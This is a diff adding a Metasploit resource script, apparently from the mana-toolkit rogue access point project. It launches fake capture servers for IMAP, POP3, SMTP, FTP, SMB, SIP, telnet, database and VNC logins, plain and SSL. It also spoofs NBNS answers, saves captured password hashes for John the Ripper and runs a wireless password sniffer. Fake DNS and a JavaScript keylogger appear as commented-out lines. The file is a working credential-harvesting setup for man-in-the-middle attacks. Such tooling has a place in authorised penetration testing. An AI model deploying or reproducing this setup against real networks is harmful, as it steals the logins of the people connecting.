@@ -1,0 +1,109 @@
+#DNS
+
+#use auxiliary/server/fakedns
+#set TARGETACTION FAKE
+#set TARGETHOST 10.0.0.1
+#set TARGETDOMAIN *
+#exploit -j
+
+#Unencrypted services
+
+use auxiliary/server/capture/imap
+exploit -j
+
+use auxiliary/server/capture/pop3
+exploit -j
+
+use auxiliary/server/capture/smtp
+exploit -j
+
+use auxiliary/server/capture/ftp
+exploit -j
+
+use auxiliary/spoof/nbns/nbns_response
+set SPOOFIP 10.0.0.1
+exploit -j
+
+use auxiliary/server/capture/smb
+set JOHNPWFILE /var/lib/mana-toolkit/captured-smb-hashes.john
+exploit -j
+
+use auxiliary/server/capture/sip
+set JOHNPWFILE /var/lib/mana-toolkit/captured-sip-hashes.john
+exploit -j
+
+use auxiliary/server/capture/telnet
+exploit -j
+
+use auxiliary/server/capture/printjob_capture
+exploit -j
+
+use auxiliary/server/capture/drda
+exploit -j
+
+use auxiliary/server/capture/postgresql
+set SRVHOST 10.0.0.1
+exploit -j
+set SRVHOST 0.0.0.0
+
+use auxiliary/server/capture/mysql
+set JOHNPWFILE /var/lib/mana-toolkit/captured-mysql-hashes.john
+exploit -j
+
+use auxiliary/server/capture/mssql
+set JOHNPWFILE /var/lib/mana-toolkit/captured-mssql-hashes.john
+exploit -j
+
+use auxiliary/server/capture/vnc
+set JOHNPWFILE /var/lib/mana-toolkit/captured-vnc-hashes.john
+exploit -j
+
+use auxiliary/server/capture/vnc
+set JOHNPWFILE /var/lib/mana-toolkit/captured-vnc-hashes.john
+set SRVPORT 5901
+exploit -j
+
+#SSL Services
+
+use auxiliary/server/capture/imap
+set SRVPORT 993
+set SSL true
+exploit -j
+
+use auxiliary/server/capture/pop3
+set SRVPORT 995
+set SSL true
+exploit -j
+
+use auxiliary/server/capture/smtp
+set SRVPORT 465
+set SSL true
+exploit -j
+
+use auxiliary/server/capture/telnet
+set SRVPORT 992
+set SSL true
+exploit -j
+
+#use auxiliary/server/capture/http
+#set SSL false
+#set SRVPORT 80
+#exploit -j
+
+#use auxiliary/server/capture/http_basic
+#set URIPATH /
+#set SSL true
+#set SRVPORT 443
+#exploit -j
+
+#use auxiliary/server/capture/http_javascript_keylogger
+#set URIPATH /
+#set SSL true
+#set SRVPORT 443
+#exploit -j
+
+#Sniffer
+
+use auxiliary/sniffer/psnuffle
+set INTERFACE wlan0
+exploit -j
